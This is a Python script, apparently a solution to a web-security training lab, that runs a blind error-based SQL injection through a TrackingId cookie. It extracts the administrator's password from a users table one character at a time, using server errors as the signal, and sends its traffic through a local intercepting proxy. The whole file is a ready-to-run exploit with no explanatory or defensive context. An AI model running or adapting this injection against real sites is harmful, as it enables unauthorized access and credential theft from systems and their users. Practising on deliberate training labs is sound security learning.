import sys
import requests
import urllib3
import urllib.parse
import logging

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Global variables
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
session_token = 'aE2b3VlLRZZ6ouE42cn88hTYownnZ72U'

def sqli_password(url):
    password_extracted = ""
    for i in range(1, 21):
        for j in range(32, 126):
            try:
                sqli_payload = "' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i, j)
                sqli_payload_encode = urllib.parse.quote(sqli_payload)
                cookies = {'TrackingId': 'Y4FYVjo3U13O8bgR' + sqli_payload_encode, 'session': session_token}
                r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
                
                if r.status_code == 500:
                    password_extracted += chr(j)
                    sys.stdout.write('\r' + password_extracted)
                    sys.stdout.flush()
                    break
                else:
                    sys.stdout.write('\r' + password_extracted + chr(j))
                    sys.stdout.flush()
            
            except requests.RequestException as e:
                logger.error(f"Request failed: {e}")
                continue
            
            except Exception as e:
                logger.error(f"Error occurred: {e}")
                continue

def main():
    if len(sys.argv) != 2:
        url = input("Enter the URL: ")
    else:
        url = sys.argv[1]
    
    logger.info("(+) Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()
